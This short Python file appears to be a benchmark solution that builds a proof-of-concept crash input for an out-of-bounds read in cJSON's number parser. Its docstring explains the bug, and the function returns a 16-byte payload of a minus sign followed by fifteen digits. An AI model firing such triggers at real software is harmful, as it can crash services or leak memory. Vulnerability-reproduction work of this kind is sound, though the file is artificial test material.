import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        
        The vulnerability (CVE-2019-1010239 or similar in cJSON < 1.7.15) involves 
        `parse_number` advancing the buffer pointer when a leading '-' is encountered, 
        without adjusting the remaining length or checking bounds correctly for the 
        shifted window. This allows the parser to read one byte past the end of the 
        input buffer (OOB Read).
        
        If the input buffer is allocated on the stack (common in fuzz harnesses), 
        ASAN reports this as a Stack Buffer Overflow.
        
        To trigger the crash on a buffer of size L (Ground Truth = 16):
        1. Start with '-' to trigger the pointer advance.
        2. Follow with valid digits to keep the parsing loop active.
        3. The loop continues until it tries to read the byte at index L (which is L+1 
           relative to the original buffer start due to the shift), causing the crash.
        """
        # Ground truth length is 16 bytes.
        # Payload: "-" (1 byte) + "1" * 15 (15 bytes) = 16 bytes.
        return b"-" + b"1" * 15